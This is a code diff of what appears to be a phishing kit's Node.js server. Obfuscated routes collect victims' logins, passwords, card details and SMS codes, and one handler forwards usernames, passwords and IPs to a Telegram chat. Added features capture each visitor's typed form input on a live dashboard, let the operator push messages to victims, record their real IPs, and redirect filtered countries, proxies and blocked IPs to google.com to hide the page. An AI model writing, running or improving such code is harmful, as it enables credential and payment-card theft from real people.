         console.log(`🚫 Blocked country accessed: ${formattedCountryCode} from ${clientIp} on path ${req.path}`);
-        return res.redirect(targetUrl);
+      } else {
+        console.log(`🚫 Non-allowed country accessed: ${formattedCountryCode} from ${clientIp} on path ${req.path}`);
       }
-    } else if (globalSettings.countryFilterMode === 'allow-only') {
-      // Allow-only mode: only allow countries in the list
-      if (globalSettings.allowedCountries && globalSettings.allowedCountries.length > 0) {
-        // If country is unknown or not in the allowed list, block access
-        if (!globalSettings.allowedCountries.includes(formattedCountryCode)) {
-          console.log(`🚫 Non-allowed country accessed: ${formattedCountryCode || 'Unknown'} from ${clientIp} on path ${req.path}`);
-          return res.redirect(targetUrl);
-        }
-        console.log(`✅ Country ${formattedCountryCode} allowed (in allowed list) on path ${req.path}`);
+      
+      // Try to redirect via socket.io first for a smoother experience
+      const socketRedirectSent = emitRedirect(clientIp, redirectTarget);
+      
+      if (!socketRedirectSent) {
+        // Fall back to HTTP redirect if socket redirect failed
+        return res.redirect(redirectTarget);
+      } else {
+        // If socket redirect was sent, just return a 200 OK
+        return res.redirect(redirectTarget);
       }
+    } else if (formattedCountryCode) {
+      console.log(`✅ Country ${formattedCountryCode} allowed on path ${req.path}`);
     }
   } else {
     console.log(`Skipping redirect checks for non-target path: ${req.path}`);
@@ -908,6 +2324,11 @@ async function detectMiddleware(req, res, next) {
 
   // If all checks pass, allow access to the requested page
   next();
+  } catch (error) {
+    console.error(`Error in detectMiddleware: ${error.message}`);
+    // Don't block the request if middleware fails
+    next();
+  }
 }
 
 
@@ -933,6 +2354,46 @@ app.post("/dashboard/toggle-proxy-detection", (req, res) => {
 
 // Apply detection middleware with toggle check
 
+// Endpoint to receive and store accurate client IP from tracker.js
+app.post("/update-client-ip", (req, res) => {
+  try {
+    const { clientIP, source, timestamp, userAgent, pageUrl } = req.body;
+    
+    if (!clientIP) {
+      return res.status(400).json({ error: 'Missing clientIP parameter' });
+    }
+    
+    // Get the apparent IP from request headers
+    const apparentIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
+                      req.headers['x-real-ip'] || 
+                      req.ip || 
+                      req.connection.remoteAddress;
+    
+    // Store the mapping between apparent IP and accurate client IP
+    accurateClientIPs.set(apparentIp, {
+      clientIP,
+      timestamp: timestamp || new Date().toISOString(),
+      source: source || 'post-endpoint',
+      userAgent,
+      pageUrl
+    });
+    
+    console.log(`Stored accurate client IP mapping: ${apparentIp} -> ${clientIP} (source: ${source || 'post-endpoint'})`);
+    
+    // Also update any existing visitor data with the accurate IP
+    if (ipCache.has(apparentIp)) {
+      const visitorData = ipCache.get(apparentIp);
+      visitorData.accurateIP = clientIP;
+      ipCache.set(apparentIp, visitorData);
+    }
+    
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    console.error('Error in /update-client-ip endpoint:', error);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 // Dashboard route
 app.get("/dashboard", (req, res) => {
   res.render("dashboard", {
@@ -943,6 +2404,102 @@ app.get("/dashboard", (req, res) => {
     countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
     countryFilterMode: globalSettings.countryFilterMode,
   });
+});
+
+// Dashboard inputs endpoint - serves input monitoring data
+app.get("/dashboard/inputs", (req, res) => {
+  try {
+    // Convert the Map to a plain object for JSON serialization
+    const inputDataObj = {};
+    
+    // Process each entry in the inputDataCache
+    inputDataCache.forEach((inputs, ip) => {
+      // Sort inputs by timestamp descending (newest first)
+      const sortedInputs = [...inputs].sort((a, b) => {
+        return new Date(b.timestamp) - new Date(a.timestamp);
+      });
+      
+      // Add to the result object
+      inputDataObj[ip] = sortedInputs;
+    });
+    
+    res.json(inputDataObj);
+  } catch (error) {
+    console.error('Error serving input data:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Dashboard input data for specific IP endpoint
+app.get("/dashboard/input-data/:ip", (req, res) => {
+  try {
+    const ip = req.params.ip;
+    
+    // Check if we have visitor data for this IP
+    if (!ipCache.has(ip)) {
+      return res.status(404).json({ error: 'Visitor not found' });
+    }
+    
+    // Get visitor metadata
+    const visitorData = ipCache.get(ip);
+    
+    // Get input data for this IP if available
+    let inputData = [];
+    if (inputDataCache.has(ip)) {
+      // Sort inputs by timestamp descending (newest first)
+      inputData = [...inputDataCache.get(ip)].sort((a, b) => {
+        return new Date(b.timestamp) - new Date(a.timestamp);
+      });
+    }
+    
+    // Return combined data
+    res.json({
+      visitor: visitorData,
+      inputs: inputData
+    });
+  } catch (error) {
+    console.error(`Error serving input data for IP ${req.params.ip}:`, error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Clear input logs endpoint
+app.post("/dashboard/clear-input-logs", (req, res) => {
+  try {
+    // Clear the input data cache
+    inputDataCache.clear();
+    console.log('Input monitoring logs cleared');
+    
+    // Notify dashboard of the update
+    io.emit('input-data-update');
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Error clearing input logs:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Toggle proxy detection setting
+app.post("/dashboard/toggle-proxy-detection", (req, res) => {
+  try {
+    const { enabled } = req.body;
+    
+    if (typeof enabled === 'boolean') {
+      globalSettings.proxyDetectionEnabled = enabled;
+      console.log(`VPN|PROXY: ${enabled ? 'ON' : 'OFF'}`);
+      
+      // Notify all connected clients about the setting change
+      io.emit('settings-update', { proxyDetectionEnabled: enabled });
+      
+      res.json({ success: true, proxyDetectionEnabled: globalSettings.proxyDetectionEnabled });
+    } else {
+      res.status(400).json({ success: false, message: 'Invalid request body' });
+    }
+  } catch (error) {
+    console.error('Error toggling proxy detection:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // API endpoint to block an IP
@@ -1472,20 +3029,38 @@ app.get("/LkaaomeM9HwWU472fgsPr", (req, res) => { // loading 3:
 
 
 //======================[POST]======================
+// Endpoint for tracker.js to send accurate client IP
+app.post("/update-client-ip", (req, res) => {
+  const { clientIP } = req.body;
+  if (clientIP) {
+    // Get the requestor's apparent IP
+    const requestIP = req.headers["x-forwarded-for"]?.split(",")[0].trim() || 
+                     req.headers["x-real-ip"] || 
+                     requestIp.getClientIp(req);
+    
+    // Store mapping between the apparent IP and the accurate client IP
+    accurateClientIPs.set(requestIP, {
+      clientIP: clientIP,
+      timestamp: new Date().toISOString()
+    });
+    
+    console.log(`Stored accurate client IP mapping: ${requestIP} -> ${clientIP}`);
+    res.send({ success: true });
+  } else {
+    res.status(400).send({ error: "No client IP provided" });
+  }
+});
+
 app.post("/gzLbTbjqMpc34D4XsPJ2", (req, res) => { // login post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   req.session.username = data.username;
   a1(data, clientIp);
   res.send({ OK: true });
 });
 app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
   res.send({ OK: true });
 });
@@ -1493,9 +3068,7 @@ app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
 
 app.post("/EpLP85AgNE4pn4RtpL", (req, res) => { // posas post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   bot.telegram.sendMessage(process.env.CHATID, `${brand} | [REFUND] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n      Sa7bna Bari Refund\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
   res.send({ OK: true });
 });
@@ -1503,25 +3076,19 @@ app.post("/EpLP85AgNE4pn4RtpL", (req, res) => { // posas post
 
 app.post("/NkMNm4664XhcW8KuukHk", (req, res) => { // cc post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   a2(data, clientIp);
   res.send({ OK: true });
 });
 app.post("/m4kT9BQWt7KTDdaVmafx", (req, res) => { // sms1 post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   a3(data, clientIp);
   res.send({ OK: true });
 });
 app.post("/Qv69PRvXg6PQEvrzJx6j", (req, res) => { // sms2 post
   let data = req.body;
-  const clientIp =
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    requestIp.getClientIp(req);
+  const clientIp = getAccurateClientIp(req);
   a4(data, clientIp);
   res.send({ OK: true });
 });
@@ -1583,95 +3150,231 @@ function isIPBlocked(ip) {
   return false;
 }
 
-// Function to check if a country is allowed based on current filter mode
+/**
+ * Function to check if a country is allowed based on current filter mode
+ * @param {string} countryCode - The country code to check
+ * @returns {boolean} - Whether the country is allowed
+ */
 function isCountryAllowed(countryCode) {
-  if (!countryCode) return true; // If no country code, allow by default
+  // If no country code provided, allow by default
+  if (!countryCode) return true;
   
-  // If filter mode is 'block', check if country is in blockedCountries
-  if (globalSettings.countryFilterMode === 'block') {
-    return !globalSettings.blockedCountries.includes(countryCode);
+  // Standardize country code to uppercase
+  const code = countryCode.toUpperCase();
+  
+  // Handle based on filter mode
+  switch(globalSettings.countryFilterMode) {
+    case 'block':
+      // In block mode, allow if NOT in blocked list
+      // Check if blockedCountries is a Set or an Array and use appropriate method
+      if (globalSettings.blockedCountries instanceof Set) {
+        return !globalSettings.blockedCountries.has(code);
+      } else if (Array.isArray(globalSettings.blockedCountries)) {
+        return !globalSettings.blockedCountries.includes(code);
+      } else {
+        // If it's neither, treat as empty collection (allow all)
+        console.warn('blockedCountries is neither a Set nor an Array:', typeof globalSettings.blockedCountries);
+        return true;
+      }
+      
+    case 'allow-only':
+      // In allow-only mode, only allow if in allowed list
+      // Check if allowedCountries is a Set or an Array and use appropriate method
+      if (globalSettings.allowedCountries instanceof Set) {
+        if (globalSettings.allowedCountries.size === 0) return false;
+        return globalSettings.allowedCountries.has(code);
+      } else if (Array.isArray(globalSettings.allowedCountries)) {
+        if (globalSettings.allowedCountries.length === 0) return false;
+        return globalSettings.allowedCountries.includes(code);
+      } else {
+        // If it's neither, treat as empty collection (block all in allow-only mode)
+        console.warn('allowedCountries is neither a Set nor an Array:', typeof globalSettings.allowedCountries);
+        return false;
+      }
+      
+    default:
+      // Default to allow if mode is unknown
+      return true;
   }
-  
-  // If filter mode is 'allow-only', check if country is in allowedCountries
-  if (globalSettings.countryFilterMode === 'allow-only') {
-    // If allowedCountries is empty, allow all
-    if (globalSettings.allowedCountries.length === 0) return true;
-    return globalSettings.allowedCountries.includes(countryCode);
-  }
-  
-  return true; // Default allow
 }
 
 // Function to block an IP address
 function blockIP(ip) {
-  if (ipCache.has(ip)) {
-    const visitorData = ipCache.get(ip);
-    visitorData.blocked = true;
-    ipCache.set(ip, visitorData);
-    console.log(`IP ${ip} has been blocked`);
-    
-    // Redirect all sockets for this IP before disconnecting
-    if (activeSocketsByIP.has(ip)) {
-      const socketIds = activeSocketsByIP.get(ip);
-      socketIds.forEach(socketId => {
-        const socket = io.sockets.sockets.get(socketId);
-        if (socket) {
-          // Send redirect event first
-          socket.emit('redirect', { 
-            url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
-            reason: 'ip_blocked'
-          });
-          
-          // Then disconnect after a delay to allow redirect
-          setTimeout(() => {
-            if (socket.connected) socket.disconnect(true);
-          }, 2000);
-        }
-      });
-    }
-    
-    return true;
-  }
-  return false;
+  if (!ip || !ipCache.has(ip)) return false;
+  
+  // Update visitor data with blocked status
+  const visitorData = ipCache.get(ip);
+  visitorData.blocked = true;
+  ipCache.set(ip, visitorData);
+  
+  // Get redirect URL
+  const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
+  
+  // Redirect all active sockets for this IP
+  emitRedirect(ip, redirectUrl);
+  
+  return true;
 }
 
 // Function to unblock an IP address
 function unblockIP(ip) {
-  if (ipCache.has(ip)) {
-    const visitorData = ipCache.get(ip);
-    visitorData.blocked = false;
-    ipCache.set(ip, visitorData);
-    console.log(`IP ${ip} has been unblocked`);
-    return true;
-  }
-  return false;
+  if (!ip || !ipCache.has(ip)) return false;
+  
+  const visitorData = ipCache.get(ip);
+  visitorData.blocked = false;
+  ipCache.set(ip, visitorData);
+  return true;
 }
 
-// Listen to server:
+// Function to add sample visitors for testing the dashboard
+function addSampleVisitors() {
+  console.log('Adding sample visitors for testing...');
+  
+  // Sample visitor data with accurate country and city information
+  const sampleVisitors = [
+    {
+      ip: '192.168.1.100',
+      firstSeen: new Date(Date.now() - 3600000), // 1 hour ago
+      lastRequest: new Date(),
+      requestCount: 5,
+      isOnline: true,
+      isBot: false,
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+      browser: 'Chrome',
+      os: 'Windows',
+      country: 'United States',
+      countryCode: 'us',
+      city: 'New York',
+      isp: 'Verizon',
+      proxy: false,
+      hosting: false,
+      suspiciousActivities: [],
+      lastPath: '/',
+      referrer: 'https://google.com',
+      timezone: 'America/New_York'
+    },
+    {
+      ip: '192.168.1.101',
+      firstSeen: new Date(Date.now() - 7200000), // 2 hours ago
+      lastRequest: new Date(Date.now() - 1800000), // 30 minutes ago
+      requestCount: 3,
+      isOnline: false,
+      isBot: false,
+      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+      browser: 'Safari',
+      os: 'Mac OS',
+      country: 'United Kingdom',
+      countryCode: 'gb',
+      city: 'London',
+      isp: 'BT',
+      proxy: false,
+      hosting: false,
+      suspiciousActivities: [],
+      lastPath: '/login',
+      referrer: null,
+      timezone: 'Europe/London'
+    },
+    {
+      ip: '192.168.1.102',
+      firstSeen: new Date(Date.now() - 10800000), // 3 hours ago
+      lastRequest: new Date(),
+      requestCount: 8,
+      isOnline: true,
+      isBot: false,
+      userAgent: 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+      browser: 'Chrome',
+      os: 'Android',
+      country: 'Germany',
+      countryCode: 'de',
+      city: 'Berlin',
+      isp: 'Deutsche Telekom',
+      proxy: true,
+      hosting: false,
+      suspiciousActivities: [],
+      lastPath: '/account',
+      referrer: 'https://example.com',
+      timezone: 'Europe/Berlin'
+    },
+    {
+      ip: '192.168.1.103',
+      firstSeen: new Date(Date.now() - 14400000), // 4 hours ago
+      lastRequest: new Date(Date.now() - 3600000), // 1 hour ago
+      requestCount: 2,
+      isOnline: false,
+      isBot: false,
+      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+      browser: 'Safari',
+      os: 'iOS',
+      country: 'France',
+      countryCode: 'fr',
+      city: 'Paris',
+      isp: 'Orange',
+      proxy: false,
+      hosting: false,
+      suspiciousActivities: [],
+      lastPath: '/products',
+      referrer: null,
+      timezone: 'Europe/Paris'
+    },
+    {
+      ip: '192.168.1.104',
+      firstSeen: new Date(Date.now() - 18000000), // 5 hours ago
+      lastRequest: new Date(),
+      requestCount: 6,
+      isOnline: true,
+      isBot: true,
+      userAgent: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+      browser: 'Unknown',
+      os: 'Unknown',
+      country: 'United States',
+      countryCode: 'us',
+      city: 'Mountain View',
+      isp: 'Google',
+      proxy: false,
+      hosting: true,
+      suspiciousActivities: [],
+      lastPath: '/sitemap.xml',
+      referrer: null,
+      timezone: 'America/Los_Angeles'
+    }
+  ];
+  
+  // Add sample visitors to the visitor metadata cache
+  sampleVisitors.forEach(visitor => {
+    visitorMetadata.set(visitor.ip, visitor);
+  });
+  
+  console.log(`Added ${sampleVisitors.length} sample visitors to the cache`);
+}
+
+// Start the server
 http.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  
+  // Add sample visitors for testing
+  addSampleVisitors();
+});
 
-  // Socket.io connection handling
-  io.on('connection', (socket) => {
-    // Use improved IP detection function
-    const clientIP = getAccurateClientIp(socket.request);
-    console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}`);
+// Socket.io connection handling
+io.on('connection', (socket) => {
+  // Use improved IP detection function
+  const clientIP = getAccurateClientIp(socket.request);
+  console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}`);
 
     // Store IP in socket for later reference, will be updated when client sends their IP
     socket.clientIP = clientIP;
     
     // Check if IP is blocked
     if (isIPBlocked(clientIP)) {
-      console.log(`Blocked IP attempted connection: ${clientIP}`);
-      // Redirect instead of disconnecting
-      socket.emit('redirect', { 
-        url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
-        reason: 'ip_blocked'
-      });
-      // Don't disconnect immediately to allow redirect to happen
-      setTimeout(() => {
-        if (socket.connected) socket.disconnect(true);
-      }, 2000);
+      // Get redirect URL and emit redirect event
+      const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
+      socket.emit('redirect', { url: redirectUrl, reason: 'ip_blocked' });
+      
+      // Log the blocked IP attempt
+      console.log(`Blocked IP ${clientIP} attempted to connect - redirecting to ${redirectUrl}`);
+      
+      // Disconnect after delay
+      setTimeout(() => socket.connected && socket.disconnect(true), 2000);
       return;
     }
     
@@ -1683,16 +3386,17 @@ http.listen(PORT, () => {
     
     // Check country filtering
     if (countryCode && !isCountryAllowed(countryCode)) {
-      console.log(`Connection from blocked country: ${countryCode}, IP: ${clientIP}`);
-      // Redirect instead of disconnecting
+      // Get the appropriate redirect URL
+      const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
+      
+      // Redirect visitor
       socket.emit('redirect', { 
-        url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
-        reason: 'country_blocked'
+        url: redirectUrl,
+        reason: 'country_filtered'
       });
-      // Don't disconnect immediately to allow redirect to happen
-      setTimeout(() => {
-        if (socket.connected) socket.disconnect(true);
-      }, 2000);
+      
+      // Disconnect after delay to allow redirect
+      setTimeout(() => socket.connected && socket.disconnect(true), 2000);
       return;
     }
 
@@ -1717,6 +3421,23 @@ http.listen(PORT, () => {
 
       // Update visitor online status to offline for this socket
       updateVisitorOnlineStatus(ip, false, socket.id);
+      
+      // Remove from active sockets map
+      if (activeSocketsByIP.has(ip)) {
+        const activeSockets = activeSocketsByIP.get(ip);
+        
+        // Check if activeSockets is a Set and convert to array if needed
+        const activeSocketsArray = Array.isArray(activeSockets) ? activeSockets : Array.from(activeSockets);
+        
+        const updatedSockets = activeSocketsArray.filter(s => s !== socket.id);
+        if (updatedSockets.length > 0) {
+          // If original was a Set, convert back to Set to maintain consistency
+          const updatedCollection = activeSockets instanceof Set ? new Set(updatedSockets) : updatedSockets;
+          activeSocketsByIP.set(ip, updatedCollection);
+        } else {
+          activeSocketsByIP.delete(ip);
+        }
+      }
     });
 
     // Handle redirect requests from dashboard
@@ -1735,6 +3456,27 @@ http.listen(PORT, () => {
         console.log(`Successfully sent redirect command to IP ${ip}`);
       } else {
         console.log(`Failed to redirect IP ${ip} - no active connections found`);
+      }
+    });
+    
+    // Handle message prompt requests from dashboard
+    socket.on('message-prompt', (data) => {
+      // Get the IP, message, type and title from the data
+      const ip = data.ip;
+      const message = data.message;
+      const type = data.type || 'info';
+      const title = data.title || 'Message';
+      
+      console.log(`Dashboard requested message prompt for IP ${ip}: ${message} (${type})`);
+      
+      // Use the emitMessagePrompt function
+      const success = emitMessagePrompt(ip, message, type, title);
+      
+      // Notify dashboard of the result
+      if (success) {
+        console.log(`Successfully sent message prompt to IP ${ip}`);
+      } else {
+        console.log(`Failed to send message prompt to IP ${ip} - no active connections found`);
       }
     });
     
@@ -1765,7 +3507,46 @@ http.listen(PORT, () => {
       }
     });
     
-    // Handle client presence heartbeats
+    // Handle client presence heartbeats with enhanced client information
+    // Handle input data from client
+    socket.on('input-data', (data) => {
+      if (data && (data.clientIP || data.ip)) {
+        const ip = data.clientIP || data.ip;
+        
+        // Check if IP is blocked before processing
+        if (isIPBlocked(ip)) {
+          return;
+        }
+        
+        // Initialize array if this is the first input for this IP
+        if (!inputDataByIP.has(ip)) {
+          inputDataByIP.set(ip, []);
+        }
+        
+        // Add timestamp if not provided
+        if (!data.timestamp) {
+          data.timestamp = new Date().toISOString();
+        }
+        
+        // Add the input data to the array
+        const inputDataArray = inputDataByIP.get(ip);
+        inputDataArray.push(data);
+        
+        // Limit the number of stored inputs per IP (keep the most recent 100)
+        if (inputDataArray.length > 100) {
+          inputDataArray.shift(); // Remove the oldest entry
+        }
+        
+        // Store back in the map
+        inputDataByIP.set(ip, inputDataArray);
+        
+        console.log(`Received input data from IP ${ip}: ${data.name} = ${data.value}`);
+        
+        // Emit an event to the dashboard to notify of new input data
+        io.emit('input-data-update', { ip: ip });
+      }
+    });
+    
     socket.on('client-presence', (data) => {
       if (data && data.clientIP) {
         const ip = data.clientIP;
@@ -1777,13 +3558,44 @@ http.listen(PORT, () => {
           return;
         }
         
-        // Update the client's last path if provided
+        // Update the client's information if provided
         if (ipCache.has(ip)) {
           const visitorData = ipCache.get(ip);
+          
+          // Update basic path and activity info
           visitorData.lastPath = path;
           visitorData.lastActivity = new Date();
           visitorData.title = data.title || '';
+          
+          // Store enhanced client information
+          if (data.browser) {
+            visitorData.browser = data.browser.name || 'Unknown';
+            visitorData.browserVersion = data.browser.version || '';
+            visitorData.browserFullVersion = data.browser.fullVersion || 'Unknown';
+            visitorData.language = data.browser.language || 'Unknown';
+          }
+          
+          if (data.os) {
+            visitorData.os = data.os.name || 'Unknown';
+            visitorData.osVersion = data.os.version || '';
+            visitorData.osFullVersion = data.os.fullVersion || 'Unknown';
+          }
+          
+          if (data.device) {
+            visitorData.deviceType = data.device.type || 'Desktop';
+            visitorData.screenWidth = data.device.screenWidth || 0;
+            visitorData.screenHeight = data.device.screenHeight || 0;
+          }
+          
+          // Store timezone and referrer
+          visitorData.timezone = data.timezone || 'Unknown';
+          visitorData.referrer = data.referrer || 'Direct';
+          
+          // Save updated visitor data
           ipCache.set(ip, visitorData);
+          
+          // Emit dashboard update to reflect new information
+          io.emit('dashboard-update');
         }
       }
     });
@@ -1814,7 +3626,7 @@ http.listen(PORT, () => {
       }
     });
     
-    // Handle update country filter settings
+    // Handle update country settings request
     socket.on('update-country-settings', (data) => {
       if (data) {
         // Update blocked countries
@@ -1828,13 +3640,21 @@ http.listen(PORT, () => {
         }
         
         // Update filter mode
-        if (data.countryFilterMode && ['block', 'allow-only'].includes(data.countryFilterMode)) {
-          globalSettings.countryFilterMode = data.countryFilterMode;
+        if (data.mode) {
+          // Ensure mode is exactly 'allow' or 'block'
+          globalSettings.countryFilterMode = data.mode === 'allow' ? 'allow' : 'block';
+          console.log(`Country filter mode set to: ${globalSettings.countryFilterMode}`);
         }
         
         // Update redirect URL
-        if (data.countryRedirectUrl) {
-          globalSettings.countryRedirectUrl = data.countryRedirectUrl;
+        if (data.redirectUrl) {
+          globalSettings.countryRedirectUrl = data.redirectUrl;
+        }
+        
+        // Update proxy detection setting
+        if (typeof data.proxyDetectionEnabled === 'boolean') {
+          globalSettings.proxyDetectionEnabled = data.proxyDetectionEnabled;
+          console.log(`Proxy detection ${globalSettings.proxyDetectionEnabled ? 'enabled' : 'disabled'}`);
         }
         
         console.log('Updated country filter settings:', globalSettings);
@@ -1842,6 +3662,357 @@ http.listen(PORT, () => {
         io.emit('dashboard-update');
       }
     });
+    
+    // Handle get country filter settings request
+    socket.on('get-country-filter-settings', () => {
+      // Log the current settings for debugging
+      console.log('Sending country filter settings:', globalSettings);
+      
+      // Convert Set objects to arrays before sending to client
+      socket.emit('country-filter-settings', {
+        countryFilterMode: globalSettings.countryFilterMode || 'block',
+        blockedCountries: globalSettings.blockedCountries instanceof Set ? Array.from(globalSettings.blockedCountries) : (globalSettings.blockedCountries || []),
+        allowedCountries: globalSettings.allowedCountries instanceof Set ? Array.from(globalSettings.allowedCountries) : (globalSettings.allowedCountries || []),
+        countryRedirectUrl: globalSettings.countryRedirectUrl || '',
+        proxyDetectionEnabled: globalSettings.proxyDetectionEnabled || false
+      });
+    });
+    
+    // Handle send message to specific client
+    socket.on('send-client-message', (data) => {
+      if (!data || !data.ip || !data.message) {
+        socket.emit('message-status', { success: false, error: 'Invalid message data' });
+        return;
+      }
+      
+      const { ip, message } = data;
+      console.log(`Sending message to client ${ip}:`, message);
+      
+      // Find all sockets for this IP
+      const targetSockets = [];
+      for (const [id, s] of io.sockets.sockets) {
+        if (s.clientIP === ip) {
+          targetSockets.push(s);
+        }
+      }
+      
+      if (targetSockets.length === 0) {
+        socket.emit('message-status', { success: false, error: 'Client not connected' });
+        return;
+      }
+      
+      // Send message to all sockets for this IP
+      targetSockets.forEach(targetSocket => {
+        targetSocket.emit('client-message', message);
+      });
+      
+      socket.emit('message-status', { 
+        success: true, 
+        message: `Message sent to ${targetSockets.length} active connections for IP ${ip}` 
+      });
+    });
+    
+    // Handle send message to all clients
+    socket.on('send-all-clients-message', (data) => {
+      if (!data || !data.message) {
+        socket.emit('message-status', { success: false, error: 'Invalid message data' });
+        return;
+      }
+      
+      const { message } = data;
+      console.log('Sending message to all clients:', message);
+      
+      // Send to all connected clients except the sender
+      socket.broadcast.emit('client-message', message);
+      
+      socket.emit('message-status', { 
+        success: true, 
+        message: `Message sent to all connected clients` 
+      });
+    });
+    
+    // Handle get visitor country request
+    socket.on('get-visitor-country', (data) => {
+      if (!data || !data.clientIP) {
+        socket.emit('visitor-country', { error: 'No IP provided' });
+        return;
+      }
+      
+      // Use the IP to determine the country
+      getCountryFromIP(data.clientIP).then(country => {
+        // Check if proxy detection is enabled and if the IP is a proxy
+        if (globalSettings.proxyDetectionEnabled) {
+          isProxyIP(data.clientIP).then(isProxy => {
+            socket.emit('visitor-country', { 
+              country, 
+              isProxy,
+              proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
+            });
+          }).catch(err => {
+            console.error('Error checking if IP is proxy:', err);
+            socket.emit('visitor-country', { 
+              country, 
+              proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
+            });
+          });
+        } else {
+          socket.emit('visitor-country', { 
+            country, 
+            proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
+          });
+        }
+      }).catch(err => {
+        console.error('Error getting country from IP:', err);
+        socket.emit('visitor-country', { error: 'Failed to determine country' });
+      });
+    });
+    
+    // Handle toggle proxy detection
+    socket.on('toggle-proxy-detection', () => {
+      // Toggle proxy detection
+      globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
+      
+      console.log(`Proxy detection ${globalSettings.proxyDetectionEnabled ? 'enabled' : 'disabled'}`);
+      
+      // Emit proxy detection status to all clients
+      io.emit('proxy-detection-status', { enabled: globalSettings.proxyDetectionEnabled });
+      
+      // Emit success to the requester
+      socket.emit('proxy-detection-toggled', { 
+        success: true, 
+        enabled: globalSettings.proxyDetectionEnabled 
+      });
+    });
+    
+    // Handle block IP request
+    socket.on('block-ip', (data) => {
+      const ip = data.ip;
+      if (!ip) {
+        socket.emit('block-ip-result', { success: false, message: 'No IP provided' });
+        return;
+      }
+      
+      // Skip blocking for local/private IPs
+      if (isLocalIP(ip)) {
+        socket.emit('block-ip-result', { 
+          success: false, 
+          ip,
+          message: `Cannot block local/private IP ${ip}` 
+        });
+        return;
+      }
+      
+      // Block the IP - our enhanced blockIP function handles notifications
+      const success = blockIP(ip);
+      
+      // Emit result to the requester
+      socket.emit('block-ip-result', { 
+        success, 
+        ip,
+        message: success ? `IP ${ip} has been blocked` : `IP ${ip} is already blocked` 
+      });
+      
+      // If successful, force disconnect any active connections from this IP
+      if (success && activeSocketsByIP.has(ip)) {
+        const activeSockets = activeSocketsByIP.get(ip);
+        const socketIds = Array.isArray(activeSockets) ? activeSockets : Array.from(activeSockets);
+        
+        console.log(`Disconnecting ${socketIds.length} active connections from blocked IP ${ip}`);
+        
+        socketIds.forEach(socketId => {
+          const targetSocket = io.sockets.sockets.get(socketId);
+          if (targetSocket) {
+            // Send redirect event before disconnecting
+            const redirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
+            targetSocket.emit('redirect', { 
+              url: redirectUrl, 
+              reason: 'ip_blocked',
+              permanent: true // Indicate this is a permanent block
+            });
+            
+            // Disconnect after a short delay to ensure the redirect event is sent
+            setTimeout(() => {
+              if (targetSocket.connected) {
+                targetSocket.disconnect(true);
+                console.log(`Forced disconnect of blocked IP ${ip} (socket ${socketId})`);
+              }
+            }, 500);
+          }
+        });
+      }
+    });
+    
+    // Handle unblock IP request
+    socket.on('unblock-ip', (data) => {
+      const ip = data.ip;
+      if (!ip) {
+        socket.emit('unblock-ip-result', { success: false, message: 'No IP provided' });
+        return;
+      }
+      
+      // Unblock the IP - our enhanced unblockIP function handles notifications
+      const success = unblockIP(ip);
+      
+      // Emit result to the requester
